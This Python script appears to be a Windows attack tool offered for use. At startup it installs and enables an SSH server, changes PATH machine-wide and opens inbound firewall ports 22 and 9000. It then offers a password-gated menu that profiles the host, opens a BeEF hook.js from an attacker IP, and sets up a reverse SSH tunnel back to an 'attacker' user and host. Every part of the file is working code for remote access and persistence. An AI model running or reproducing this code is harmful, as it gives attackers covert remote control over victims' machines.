import os
def cls():
    os.system("cls")

from colorama import init, Fore, Back, Style
init(autoreset=True)

import getpass
import webbrowser
import re
import socket
import sys
from time import sleep
import platform
import subprocess

def find_powershell():
    # Try PowerShell Core first
    pwsh_path = r"C:\Program Files\PowerShell\7\pwsh.exe"
    if os.path.exists(pwsh_path):
        return pwsh_path

    # Fallback to Windows PowerShell
    ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    if os.path.exists(ps_path):
        return ps_path

    raise FileNotFoundError("No PowerShell executable found")


def run_ps(command):
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    env = os.environ.copy()
    env["PATH"] += r";C:\Windows\System32\OpenSSH"
    # No capture_output, no check=True
    proc = subprocess.Popen(
        [ps, "-NoProfile", "-Command", command],
        env=env
    )
    proc.wait()

permapath = r'[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\Windows\System32\OpenSSH", [System.EnvironmentVariableTarget]::Machine)'
run_ps(permapath)

#define powershell path
pspath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

#link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
#installing OpenSSH Client and Server via PowerShell commands

installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
run_ps(installsshd)

installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
run_ps(installsshdserver)
sleep(2)
startservice="Start-Service sshd"
run_ps(startservice)
sleep(2)
startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
run_ps(startupsshd)
sleep(2)
addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
run_ps(addtopath)

fwr22 = 'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow'
run_ps(fwr22)
fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
run_ps(fwr9000)

print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
sleep(4)

#scanverify = if you dont understand go to action 0, it verifies if the scan was initiated first
scanverify = "no"
#ask for password to start the program else exit

while True:
    askforpassword = getpass.getpass(prompt = "Enter password for the program to start: ")
    sleep(0.1)
    if askforpassword != "krtek":
        print(Fore.RED + "Incorrect password, exiting...")
        sleep(0.5)
    else:
        print(Fore.GREEN + "Password correct, starting program...")
        sleep(0.5)
        break


#ask to scan the machine whilst if "y" then gather system information else if "n" ask to continue else exit
print("Welcome, ")
while True:
    cls()
    print("Choose your action: ")
    print("0) Print current machine scan outcome (only usable after action 1)") 
    sleep(0.1)
    print("")
    sleep(0.1)
    print("1) Scan this machine")
    sleep(0.1)
    print("2) Attempt to hook this machine via BeEF")
    sleep(0.1)
    print("3) Attempt a local SSH connection")
    sleep(0.1)
    print("")
    sleep(0.1)
    print("99) To exit the program")
    sleep(0.1)
    action = input("Your action: ")
    cls()


#Action 0 = Printing the outcome of the scan
    if action == "0":
        if scanverify == "yes":
            print(Fore.RED + info)
        else:
            cls()
            print("Scan was not initiated (action 1), run scan first")
            sleep(4)
    else:
        print("")

    if action == "1":
        scanverify = "yes"
        cls()
        sleep(1)
        print("System Information:")
        sleep(0.1)
        system=platform.system()
        print(Fore.RED + platform.system())
        sleep(0.1)
        node=platform.node()
        print(platform.node())
        sleep(0.1)
        machine=platform.machine()
        print(platform.machine())
        sleep(0.1)
        platform_info=platform.platform()
        print(Fore.RED + platform.platform())
        sleep(0.1)
        ip=socket.gethostbyname(socket.gethostname())
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(Fore.RED + s.getsockname()[0])
        s.close()
        sleep(1)
        input("Press Enter to continue...")
    
        info=system + "\n" + node + "\n" + machine + "\n" + platform_info + "\n" + ip

    else:
        print("")
    cls()

#Action 2 = beef hook
    if action == "2":
        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$"
        sleep(0.1)
        while True:
            beefip=input("IP that beef is running on (pure IP number with port-native port 3000): ")
            if re.match (pattern, beefip):
                cls()
                print("Valid IP, trying hook...")
                sleep(0.1)
                webbrowser.open("http://" + beefip + "/hook.js")
                print("The hook has started...")
                sleep(1)
                break

            else:
                print("Invalid IP input")
                sleep(0.1)

    else:
        print("")

#Action 3 = local SSH connection
    if action == "3":
        print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell before this action!!!")
        while True:
            attackerscriptcontinue=input("Continue? y/n: ")
            sleep(0.1)
            if attackerscriptcontinue == "n":
                print("Will not continue...")
                sleep(0.1)
            elif attackerscriptcontinue == "y":
                #stating the PS comand to persistent SSH tunnel
                attackeruser=input("Enter attacker SSH username: ")
                sleep(0.1)
                attackerip=input("Enter attacker IP (without port): ")
                sleep(0.1)
                correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
                sleep(0.1)
                if correctsshinput == "y":
                    ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
                    run_ps(ssh_tunnel)
                    sleep(10)
                    cls()
                    print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
                    sleep(1)
                    break
                else:
                    print(" ")
                    sleep(0.1)
            else:
                print(" ")
                sleep(0.1)
                break
    else:
        print("")
        sleep(0.1)

#Action 99 = exiting the program
    if action == "99":
        print("Exiting the program...")
        sleep(3)
        exit()
